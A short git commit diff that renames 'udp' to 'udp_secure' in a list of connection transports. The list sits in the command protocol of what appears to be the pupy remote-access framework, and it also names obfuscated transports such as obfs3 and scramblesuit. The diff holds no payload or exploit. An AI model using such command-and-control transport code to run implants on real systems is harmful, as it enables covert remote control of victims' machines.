454e53bb865f80ab0b0c7291d4b8660fcae50f58
Oleksii Shevchuk <ol.shevchuk@samsung.com>
2017-04-04 10:51:23 +0300

    Fix udp_secure name in picocmd

--- pupy/network/lib/picocmd/picocmd.py
+++ pupy/network/lib/picocmd/picocmd.py
@@ -387,7 +387,7 @@ class SystemInfo(Command):
 
 class Connect(Command):
     well_known_transports_decode = dict(enumerate([
-        'obfs3','udp','http','tcp_cleartext','rsa',
+        'obfs3','udp_secure','http','tcp_cleartext','rsa',
         'ssl','udp_cleartext','scramblesuit','ssl_rsa', 'ec4'
     ], 1))
 
